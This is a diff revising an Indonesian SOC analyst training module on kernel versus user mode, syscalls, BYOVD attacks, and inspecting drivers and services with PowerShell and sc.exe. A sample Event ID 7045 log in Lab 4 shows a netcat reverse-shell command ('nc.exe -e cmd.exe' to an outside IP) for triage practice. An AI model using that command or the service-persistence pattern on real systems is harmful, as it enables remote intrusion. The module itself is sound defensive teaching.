@@ -1,143 +1,351 @@
-Operating System Architecture: Kernel Mode vs User Mode
+
+
+# DAY 3 (REVISED) — Operating System Architecture: Kernel Mode vs User Mode, System Calls, Drivers & Services Inspection
 
 ## Objective
 
-Setelah menyelesaikan hari ini, kamu harus mampu:
+Setelah menyelesaikan modul intensif hari ini, kamu harus mampu:
 
-1. Memahami arsitektur keamanan OS: Perbedaan antara **Kernel Mode (Ring 0)** dan **User Mode (Ring 3)**.
-2. Menjelaskan bagaimana aplikasi meminta akses ke hardware melalui **System Calls (Syscalls)**.
-3. Memeriksa daftar **Drivers** (program Kernel) dan **Services** yang berjalan di Windows menggunakan CLI.
+1. Memahami arsitektur keamanan OS: Perbedaan mendalam antara **Kernel Mode (Ring 0)** dan **User Mode (Ring 3)**.
+2. Memahami alur kerja **System Calls (Syscalls)** dari aplikasi ke *Kernel OS*.
+3. Menganalisis **Hardware Drivers** (komponen Kernel) dan **Windows Services** menggunakan PowerShell dan Command Prompt.
+4. Mendeteksi indikasi serangan **Bring Your Own Vulnerable Driver (BYOVD)** dan pematikan service keamanan secara tidak sah.
+5. Membaca artifact log pembuatan service baru (**Event ID 7045**) dan perubahan status service (**Event ID 7036**).
 
 ---
 
-## Theory
+## Theory (Deep Dive)
 
 ### 1. WHAT — Apa itu Kernel Mode & User Mode?
 
-Sistem operasi (seperti Windows dan Linux) membagi ruang eksekusi menjadi beberapa tingkat hak akses (*CPU Privilege Rings*):
-
-* **Kernel Mode (Ring 0):** Pusat terdalam dari OS. Memiliki akses tanpa batas ke hardware, CPU, dan seluruh memori RAM. Komponen yang berjalan di sini adalah *OS Kernel* dan *Hardware Drivers* (driver VGA, driver WiFi, dll).
-* **User Mode (Ring 3):** Area terluar yang terisolasi. Tempat berjalannya semua aplikasi biasa (Browser, Discord, Word, Notepad). Aplikasi di User Mode **tidak boleh** mengakses hardware atau memori aplikasi lain secara langsung.
+Sistem operasi modern (Windows dan Linux) menggunakan proteksi berbasis hardware CPU yang memisahkan ruang eksekusi menjadi beberapa tingkatan hak akses (*CPU Privilege Rings*):
 
 ```
-+-------------------------------------------------+
-|             USER MODE (Ring 3)                  |
-|   [ Chrome.exe ]  [ Notepad.exe ]  [ Python ]   |
-+------------------------+------------------------+
-                         |  System Calls (Syscalls)
-+------------------------v------------------------+
-|            KERNEL MODE (Ring 0)                 |
-|   [ OS Kernel ]   [ Memory Mgr ]  [ Drivers ]   |
-+------------------------+------------------------+
-                         |
-                 [ HARDWARE / RAM ]
++-----------------------------------------------------------------+
+|                      USER MODE (Ring 3)                         |
+|  [ Chrome.exe ]    [ Word.exe ]    [ PowerShell ]   [ Python ]  |
+|  - Terisolasi, tidak bisa akses hardware/RAM lain secara langsung|
++-----------------------------------------------------------------+
+                                |
+                                |  System Call (Syscall) / NTDLL
+                                v
++-----------------------------------------------------------------+
+|                     KERNEL MODE (Ring 0)                        |
+|  [ OS Kernel ]    [ Memory Manager ]    [ Hardware Drivers ]    |
+|  - Akses tak terbatas ke CPU, RAM, dan seluruh Hardware         |
++-----------------------------------------------------------------+
+                                |
+                                v
+                       [ HARDWARE / RAM / SSD ]
 
 ```
 
-### 2. WHY — Kenapa SOC Analyst perlu memahami ini?
+* **User Mode (Ring 3):** Lingkungan berhak akses rendah tempat berjalannya semua aplikasi biasa. Aplikasi di User Mode terisolasi. Jika aplikasi *crash*, OS tetap berjalan stabil.
+* **Kernel Mode (Ring 0):** Pusat inti sistem operasi. Berisi *OS Kernel*, *Executive Services*, dan *Hardware Drivers*. Komponen di Ring 0 memiliki akses penuh tanpa hambatan ke seluruh RAM dan hardware. Jika ada kode di Kernel Mode yang *error* atau *crash*, seluruh OS akan langsung runtuh (**Blue Screen of Death / BSOD**).
 
-Batas antara User Mode dan Kernel Mode adalah **benteng keamanan utama OS**.
-Jika malware berjalan di User Mode, Antivirus/EDR masih bisa menghentikannya dengan mudah. Namun, jika malware berhasil masuk ke **Kernel Mode** (dikenal sebagai *Rootkit* atau *Kernel Driver Exploit*), malware tersebut bisa:
+### 2. WHY — Kenapa SOC Analyst WAJIB Memahami Ini?
 
-* Mematikan Antivirus/EDR tanpa terdeteksi.
-* Menyembunyikan proses dan filenya sendiri dari OS.
-* Membaca seluruh RAM tanpa halangan.
+Batas antara User Mode dan Kernel Mode adalah **benteng pertahanan paling krusial** pada Operating System.
 
-### 3. HOW — Bagaimana cara kerjanya (System Call)?
+* **Sisi Defensif (Keamanan):** Produk keamanan terbaik (seperti *EDR / Endpoint Detection and Response* dan *Antivirus Kernel Driver*) menempatkan sensor utamanya di **Kernel Mode (Ring 0)** agar bisa mengawasi semua aktivitas aplikasi di User Mode.
+* **Sisi Ofensif (Serangan):** Penyerang canggih (*Advanced Persistent Threat / APT*) selalu berusaha menembus Kernel Mode. Jika malware berhasil berjalan di Ring 0 (menjadi *Rootkit*), malware tersebut bisa:
+* Mematikan Antivirus/EDR tanpa bisa dihentikan.
+* Menyembunyikan file, proses, dan koneksi jaringannya dari pengawasan OS.
+* Membaca seluruh isi RAM tanpa terhalang proteksi Windows.
 
-Ketika aplikasi User Mode (misalnya Notepad) ingin menyimpan file ke SSD:
 
-1. Notepad **TIDAK BISA** langsung menulis byte ke SSD.
-2. Notepad harus mengirim permintaan resmi yang disebut **System Call (Syscall)** ke Kernel.
-3. Kernel memeriksa apakah user memiliki izin (*permission*).
-4. Jika diizinkan, Kernel-lah yang memerintahkan hardware SSD untuk menulis file tersebut.
 
-### 4. EXAMPLE — Contoh nyata
+### 3. HOW — Bagaimana System Calls (Syscalls) Bekerja?
 
-Aplikasi Antivirus / EDR modern memasang **Kernel Driver** khusus. Driver ini mencegat semua *System Calls* yang dikirim oleh aplikasi User Mode untuk menganalisis apakah ada perintah yang mencurigakan sebelum dieksekusi.
+Aplikasi di User Mode (misalnya Notepad) **TIDAK BISA** menulis file secara langsung ke SSD. Ketika kamu menekan tombol *Save*, inilah alur yang terjadi:
 
-### 5. ATTACK — Bagaimana teknik ini disalahgunakan?
+1. **User Request:** Notepad memanggil fungsi standar Windows API (`WriteFile`).
+2. **API Translation:** `WriteFile` diteruskan ke library tingkat rendah Windows (`ntdll.dll`), yang menyiapkan nomor identifikasi **System Call (Syscall)** (contoh: `NtWriteFile`).
+3. **Transition to Kernel:** CPU mengeksekusi instruksi khusus (`syscall` pada 64-bit atau `sysenter` pada 32-bit) untuk berpindah dari Ring 3 ke Ring 0.
+4. **Kernel Execution:** Kernel menerima instruksi, memeriksa *permission* user, lalu memerintahkan *Storage Driver* untuk menulis data ke sektor fisik SSD.
+5. **Return:** Control dikembalikan ke User Mode.
 
-* **Bring Your Own Vulnerable Driver (BYOVD):** Penyerang membawa driver resmi milik vendor terkenal yang memiliki celah keamanan (*vulnerability*), menginstallnya ke Windows target, lalu memanfaatkannya untuk melompati proteksi dari User Mode ke Kernel Mode (Ring 0).
+### 4. ATTACK — Bring Your Own Vulnerable Driver (BYOVD) & Service Abuse
 
-### 6. DEFENSE — Bagaimana SOC mendeteksi atau mencegahnya?
+Karena Windows mewajibkan seluruh Driver Kernel ditandatangani secara resmi oleh Microsoft (**Driver Signature Enforcement / DSE**), penyerang kesulitan membuat driver jahat dari nol.
 
-* Windows memiliki fitur bernama **Driver Signature Enforcement** (semua driver Kernel harus ditandatangani secara digital oleh Microsoft).
-* SOC memantau event pembuatan Service atau pemasangan Driver baru (Windows Event ID `7045` / Sysmon Event ID `6`).
+Sebagai gantinya, penyerang menggunakan teknik **Bring Your Own Vulnerable Driver (BYOVD)**:
+
+1. Penyerang membawa driver **RESMI dan SAH** milik vendor ternama (seperti driver hardware lama buatan ASUS, Capcom, atau Gigabyte) yang memiliki celah keamanan (*vulnerability*).
+2. Penyerang menginstall driver resmi tersebut ke komputer target menggunakan hak akses Administrator.
+3. Penyerang mengeksploitasi celah pada driver resmi itu untuk menyuntikkan kode jahat langsung ke **Kernel Mode (Ring 0)**.
+4. Setelah berada di Ring 0, penyerang mematikan proses EDR/Antivirus di RAM.
+
+### 5. DEFENSE — Cara SOC Menganalisis & Mendeteksi
+
+SOC Analyst memantau:
+
+* **Pemasangan Driver Baru:** Sysmon Event ID 6 (*Driver Loaded*) atau Windows Event ID 7045 (*Service/Driver Installed*).
+* **Driver Blocklist:** Memastikan Windows memanfaatkan *Microsoft Vulnerable Driver Blocklist*.
+* **Service State Monitoring:** Alert otomatis jika service keamanan kritis (seperti `WinDefend` atau agent EDR) mendadak berubah status menjadi `STOPPED`.
 
 ---
 
-## Hands-on
+## Detailed Command & Script Breakdown
 
-Kita akan memeriksa komponen yang berjalan di tingkat Kernel (Driver) dan Service menggunakan PowerShell.
+Sebelum memulai praktek, mari bedah perintah-perintah CLI yang akan kita gunakan hari ini:
 
-1. Buka **PowerShell** (Run as Administrator).
-2. Tampilkan seluruh **Hardware Driver** yang terinstall dan sedang berjalan (*Running*) di Windows:
-```powershell
-Get-WmiObject Win32_SystemDriver | Where-Object {$_.State -eq "Running"} | Select-Object Name, DisplayName, State, ServiceType | Select-Object -First 10
+### 1. Memeriksa Driver via `driverquery` (Cmd)
 
-```
-
-
-3. Alternatif perintah bawaan Windows CLI untuk melihat daftar driver lengkap:
 ```cmd
-driverquery
+driverquery /FO CSV /v
 
 ```
 
+* **`driverquery`**: Perintah CLI Windows untuk menampilkan seluruh driver Kernel yang terinstall.
+* **`/FO CSV`**: Mengubah format output menjadi CSV agar mudah dibaca atau diolah.
+* **`/v`**: (*Verbose*) Menampilkan detail mendalam seperti lokasi file `.sys`, status memori, dan tipe driver.
 
-4. Tampilkan daftar **Services** yang berjalan di background sistem:
+### 2. Memeriksa Driver via PowerShell (WMI/CIM)
+
 ```powershell
-Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object Name, DisplayName, Status | Select-Object -First 10
+Get-CimInstance Win32_SystemDriver | Where-Object {$_.State -eq "Running"} | Select-Object Name, DisplayName, PathName, StartMode
+
+```
+
+* **`Get-CimInstance Win32_SystemDriver`**: Mengambil data class `Win32_SystemDriver` dari Kernel.
+* **`Where-Object {$_.State -eq "Running"}`**: Menyaring (*filter*) hanya driver yang saat ini sedang aktif di memori RAM.
+* **`PathName`**: Jalur lokasi file fisik driver (biasanya berakhiran `.sys` di `C:\Windows\System32\drivers\`).
+
+### 3. Memeriksa Windows Service via `sc.exe`
+
+```cmd
+sc.exe qc WinDefend
+
+```
+
+* **`sc.exe`**: (*Service Control*) Utility CLI utama Windows untuk berkomunikasi dengan *Service Control Manager (SCM)*.
+* **`qc`**: (*Query Configuration*) Memeriksa konfigurasi teknis dari sebuah service.
+* **`WinDefend`**: Nama teknis (*Service Name*) dari Windows Defender.
+
+---
+
+## Multi-Part Hands-On Labs
+
+Siapkan laptopmu, buka **PowerShell (Run as Administrator)**.
+
+---
+
+### LAB 1: Auditing Kernel Drivers di RAM (Kernel Mode Inspection)
+
+**Skenario:** Kamu ditugaskan melakukan audit terhadap komponen yang saat ini sedang berjalan di **Kernel Mode (Ring 0)** pada komputer klien.
+
+**Langkah Kerja:**
+
+1. Buka PowerShell Administrator.
+2. Jalankan perintah ini untuk melihat jumlah total Driver Kernel yang sedang aktif:
+```powershell
+(Get-CimInstance Win32_SystemDriver | Where-Object {$_.State -eq "Running"}).Count
 
 ```
 
 
+*(Catat berapa jumlah driver yang berjalan di sistemmu).*
+3. Tampilkan 10 driver pertama beserta lokasi file fisik `.sys` nya:
+```powershell
+Get-CimInstance Win32_SystemDriver | Where-Object {$_.State -eq "Running"} | Select-Object Name, DisplayName, PathName | Select-Object -First 10 | Format-Table -AutoSize
+
+```
+
+
+4. **Verifikasi Keberadaan File Driver:**
+Ambil salah satu `PathName` dari output di atas (contoh: `C:\WINDOWS\system32\drivers\etc...sys`).
+Cek apakah file tersebut benar-benar ada di disk menggunakan PowerShell:
+```powershell
+Test-Path "C:\Windows\System32\drivers\afd.sys"
+
+```
+
+
+*(Ganti nama file `.sys` sesuai dengan salah satu hasil di komputermu. Output `True` membuktikan file fisik driver tersebut ada).*
 
 ---
 
-## Challenge
+### LAB 2: Deep Inspection pada Security Services (User-to-Kernel Bridge)
 
-**Instruksi:**
+**Skenario:** Penyerang sering mencoba mematikan service keamanan. Kamu harus bisa memeriksa status, hak akses, dan binary path dari service keamanan Windows.
 
-1. Gunakan PowerShell untuk mencari **Service** yang berhubungan dengan keamanan bawaan Windows, yaitu **Windows Defender** (Nama servicetypical: `WinDefend` atau `Sense`).
-2. Tuliskan perintah PowerShell yang kamu gunakan untuk memeriksa status service `WinDefend`.
-3. Tampilkan output yang menunjukkan apakah Service tersebut sedang **Running** atau **Stopped**.
+**Langkah Kerja:**
 
-*(Kerjakan sendiri di komputermu!)*
+1. Jalankan perintah PowerShell ini untuk memeriksa status service **Windows Defender (`WinDefend`)** dan **Windows Firewall (`MpsSvc`)**:
+```powershell
+Get-Service -Name "WinDefend", "MpsSvc" | Select-Object Name, DisplayName, Status, StartType
+
+```
+
+
+2. Mari periksa konfigurasi teknis mendalam dari `WinDefend` menggunakan `sc.exe`:
+```cmd
+sc.exe qc WinDefend
+
+```
+
+
+3. **Analisis Output `sc.exe`:**
+* **`BINARY_PATH_NAME`**: Menunjukkan executable yang mengeksekusi service ini (`C:\ProgramData\Microsoft\Windows Defender\Platform\...` atau `C:\Program Files\Windows Defender\MsMpEng.exe`).
+* **`START_TYPE`**: Menunjukkan apakah service jalan otomatis saat boot (`AUTO_START`), manual (`DEMAND_START`), atau dimatikan (`DISABLED`).
+* **`SERVICE_START_NAME`**: Akun user yang menjalankan service ini (biasanya `NT AUTHORITY\LocalSystem` atau `NT AUTHORITY\NetworkService`).
+
+
 
 ---
 
-## SOC Connection
+### LAB 3: Simulasi Membuat & Memeriksa Custom Service (Controlled Lab)
 
-Salah satu indikator pertama sebuah sistem telah diretas secara kritis adalah ketika **EDR / Antivirus Agent tiba-tiba mati**.
+**Skenario:** Kita akan membuat sebuah *Dummy Service* lokal bernama `SOC_Test_Service` untuk mensimulasikan bagaimana penyerang membuat service baru untuk **Persistence** (bertahan di dalam sistem setelah reboot).
 
-Ketika ada alert:
+> **Peringatan Keamanan:** Kita hanya membuat service dummy yang mengarahkan ke executable aman bawaan Windows (`notepad.exe`) lalu menghapusnya kembali.
 
-> `Critical Alert: Windows Defender Service (WinDefend) has been STOPPED`
+**Langkah Kerja:**
 
-Seorang SOC Analyst harus paham bahwa ada kemungkinan penyerang menggunakan akses Administrator atau *Kernel Exploit* untuk mematikan pertahanan sistem.
+1. Buat service baru bernama `SOC_Test_Service` menggunakan `sc.exe`:
+```cmd
+sc.exe create SOC_Test_Service binPath= "C:\Windows\System32\notepad.exe" start= auto DisplayName= "SOC Analyst Test Service"
+
+```
+
+
+*(Pastikan muncul pesan `[SC] CreateService SUCCESS`).*
+2. Verifikasi keberadaan service baru tersebut menggunakan PowerShell:
+```powershell
+Get-Service -Name "SOC_Test_Service" | Select-Object Name, DisplayName, Status, StartType
+
+```
+
+
+3. Periksa lokasi file eksekusinya via PowerShell WMI:
+```powershell
+Get-CimInstance Win32_Service -Filter "Name = 'SOC_Test_Service'" | Select-Object Name, PathName, StartMode, State
+
+```
+
+
+4. **Pembersihan (Cleanup):**
+Hapus service tes tersebut dari sistem agar komputermu tetap bersih:
+```cmd
+sc.exe delete SOC_Test_Service
+
+```
+
+
+*(Pastikan muncul pesan `[SC] DeleteService SUCCESS`).*
+
+---
+
+### LAB 4: Analisis Raw Log (Service Creation Artifact Triage)
+
+Ketika sebuah service dibuat di Windows (seperti pada LAB 3), Windows secara otomatis mencatat **Event ID 7045** di dalam System Event Log.
+
+Berikut adalah contoh data log mentah yang ditangkap oleh SIEM saat insiden terjadi:
+
+```text
+===============================================================================
+LOG ENTRY #8841 - WINDOWS SYSTEM AUDIT (EVENT ID 7045)
+Timestamp: 2026-09-22T10:15:30Z
+Computer: HR-PC-04.CORP.LOCAL
+
+Service Name:         UpdateCheckService
+Service File Name:    C:\Users\Public\Downloads\nc.exe -e cmd.exe 192.168.1.50 4444
+Service Type:         user start
+Service Start Type:   auto start
+Service Account:      LocalSystem
+===============================================================================
+
+```
+
+**Analisis Struktur Log oleh Analyst:**
+
+* **`Service Name`**: `UpdateCheckService` (Penyerang menggunakan nama yang seolah-olah update resmi).
+* **`Service File Name`**: `C:\Users\Public\Downloads\nc.exe -e cmd.exe 192.168.1.50 4444`.
+* **ANOMALI CRITICAL:** File eksekusi berjalan dari folder `Users\Public\Downloads`.
+* **ANOMALI CRITICAL:** File `nc.exe` (*Netcat*) dieksekusi dengan argumen `-e cmd.exe` yang diarahkan ke IP luar (`192.168.1.50`). Ini adalah perintah pembuatan **Reverse Shell**!
+
+
+* **`Service Account`**: `LocalSystem` (Service ini berjalan dengan hak akses tertinggi di OS / NT AUTHORITY\SYSTEM).
+
+---
+
+## Challenge (Uji Kemampuan Praktis)
+
+Kerjakan **3 Tugas Tantangan** berikut di komputermu dan simpan hasilnya:
+
+### Challenge 1: Driver Directory Audit
+
+1. Jalankan perintah PowerShell untuk mencari seluruh Driver yang memiliki `PathName` di luar folder standar `C:\Windows\System32\drivers\`.
+2. Tuliskan perintah PowerShell yang kamu gunakan!
+3. Apakah kamu menemukan driver yang berlokasi di luar direktori standar tersebut? Tuliskan nama drivernya jika ada!
+
+### Challenge 2: Security Services Health Check
+
+1. Gunakan PowerShell untuk memeriksa status dari 3 service berikut sekaligus:
+* `WinDefend` (Windows Defender)
+* `MpsSvc` (Windows Firewall)
+* `wuauserv` (Windows Update)
+
+
+2. Tampilkan output kolom `Name`, `Status`, dan `StartType`.
+3. Tuliskan perintah tepat yang kamu gunakan dan salin outputnya!
+
+### Challenge 3: Triage Insiden Log Event ID 7045
+
+Bacalah data log mentah dari **LAB 4** di atas, lalu jawab pertanyaan triase berikut sebagai SOC Analyst:
+
+1. Apakah event ini tergolong **True Positive (Serangan Nyata)** atau **False Positive (Aktivitas Normal)**? Berikan 2 alasan teknis mendasar!
+2. Mengapa penyerang memilih menggunakan `Service Account: LocalSystem` saat membuat service jahat?
+3. Apa tindakan penanganan pertama (*Immediate Containment*) yang harus direkomendasikan oleh SOC Analyst jika melihat log ini pada komputer karyawan?
+
+---
+
+## SOC Connection & Mindset
+
+Saat melakukan investigasi insiden terkait Driver dan Service, gunakan pola pikir ini:
+
+1. **"Siapa yang menjalankan Service ini?"**
+* Sebagian besar service bawaan Windows berjalan di bawah akun `NT AUTHORITY\LocalSystem`, `LocalService`, atau `NetworkService`. Jika ada service baru berjalan di bawah akun user biasa (misal: `CORP\john_doe`), itu mencurigakan!
+
+
+2. **"Di mana lokasi executable `.exe` atau `.sys` nya?"**
+* Normal: `C:\Windows\System32\`, `C:\Program Files\`.
+* MENCURIGAKAN: `C:\Users\...\AppData\`, `C:\Windows\Temp\`, `C:\Users\Public\`.
+
+
+3. **"Apakah Service/Driver ini baru saja terinstall saat terjadi insiden?"**
+* Selalu cocokkan waktu insiden (*timestamp*) dengan waktu munculnya **Event ID 7045** pada SIEM.
+
+
 
 ---
 
 ## Evidence
 
-Simpan ke dalam folder catatan belajar:
+Simpan bukti-bukti berikut ke dalam catatan/folder laporan belajarmu:
 
-1. Screenshot / text snippet perintah `Get-Service` dan `driverquery` pada bagian **Hands-on**.
-2. Perintah PowerShell dan hasil output status `WinDefend` pada bagian **Challenge**.
+1. **Screenshot / Text Output** dari **LAB 1** (Hasil pengecekan driver di RAM dan pengujian `Test-Path`).
+2. **Screenshot / Text Output** dari **LAB 2** (Hasil perintah `sc.exe qc WinDefend`).
+3. **Screenshot / Text Output** dari **LAB 3** (Bukti pembuatan dan penghapusan `SOC_Test_Service`).
+4. Perintah PowerShell dan jawaban tertulis untuk **Challenge 1, Challenge 2, dan Challenge 3**.
 
 ---
 
-## Self Test
+## Self Test (10 Pertanyaan Pemahaman Mendalam)
 
 Jawab pertanyaan ini di lembar kerja/catatanmu:
 
-1. Mengapa aplikasi di *User Mode* (Ring 3) tidak boleh mengakses memori atau hardware secara langsung?
-2. Apakah yang dimaksud dengan *System Call (Syscall)* dan mengapa itu penting dalam arsitektur OS?
-3. Kenapa malware jenis *Rootkit* yang berjalan di *Kernel Mode* (Ring 0) jauh lebih berbahaya daripada malware biasa di *User Mode*?
-4. Jika terjadi *crash* fatal pada aplikasi di *User Mode* (misal Chrome error), OS tetap berjalan normal. Namun, apa yang terjadi jika kode di *Kernel Mode* mengalami *crash*?
-5. Mengapa penyerang mengincar teknik *Bring Your Own Vulnerable Driver (BYOVD)*?
+1. Apa perbedaan mendalam antara **User Mode (Ring 3)** dan **Kernel Mode (Ring 0)** dari segi hak akses memori dan hardware?
+2. Mengapa jika terjadi kesalahan/crash pada kode di Kernel Mode, seluruh sistem operasi akan mengalami **Blue Screen of Death (BSOD)**?
+3. Jelaskan alur yang terjadi saat aplikasi di User Mode memerlukan akses ke hardware melalui **System Call (Syscall)**!
+4. Mengapa malware jenis *Rootkit* yang berjalan di Kernel Mode jauh lebih sulit dideteksi oleh Antivirus biasa yang berjalan di User Mode?
+5. Jelaskan teknik serangan **Bring Your Own Vulnerable Driver (BYOVD)** dan mengapa penyerang menggunakannya!
+6. Apa fungsi dari fitur **Driver Signature Enforcement (DSE)** pada Windows?
+7. Apa kepanjangan dari **SCM** dalam arsitektur Windows Service dan apa tugas utamanya?
+8. Nomor **Windows Event ID** berapakah yang mencatat peristiwa pembuatan service baru di dalam sistem, dan mengapa log ini sangat vital bagi SOC Analyst?
+9. Jika kamu menemukan sebuah service dengan `BINARY_PATH_NAME` mengarah ke `powershell.exe -enc ...`, mengapa hal tersebut dikategorikan sebagai ancaman bahaya tinggi (*High Severity Alert*)?
+10. Mengapa mematikan service `wuauserv` (Windows Update) secara sengaja sering dilakukan oleh penyerang setelah berhasil menguasai sebuah sistem?
 
 ---
 
@@ -145,12 +353,18 @@ Jawab pertanyaan ini di lembar kerja/catatanmu:
 
 Kamu dianggap **LULUS Day 3** jika:
 
-1. Berhasil menjalankan perintah eksekusi pengecekan Driver dan Service di PowerShell.
-2. Berhasil menyelesaikan **Challenge** dengan menampilkan status service `WinDefend`.
-3. Menjawab ke-5 pertanyaan **Self Test** dengan tepat berdasarkan pemahaman arsitektur Kernel & User mode.
+1. Berhasil mengeksekusi **LAB 1 sampai LAB 3** di komputermu tanpa error.
+2. Berhasil menyelesaikan **Challenge 1, Challenge 2, dan Challenge 3** dengan perintah CLI yang tepat dan logika analisis log yang tepat.
+3. Menjawab minimal **8 dari 10 pertanyaan Self Test** dengan pemahaman konsep yang benar.
 
 ---
 
 ### MENTOR NOTICE:
 
-Kirimkan **Jawaban Challenge**, **Evidence (Text/Screenshot)**, dan **Jawaban Self Test** Day 3 milikmu! Saya akan mengevaluasi hasilnya sebelum kita lanjut ke **DAY 4 — Windows Process Hierarchy & Parent-Child Relationships**.
+Silakan jalankan seluruh perintah di komputermu, pelajari setiap baris perintahnya, lalu kirimkan:
+
+1. **Jawaban Challenge 1, 2, dan 3**.
+2. **Evidence Hasil Lab (Text snippet atau Screenshot)**.
+3. **Jawaban 10 Pertanyaan Self Test**.
+
+Saya akan mereview hasil pekerjaanmu secara mendalam sebelum kita melangkah ke **DAY 4**!
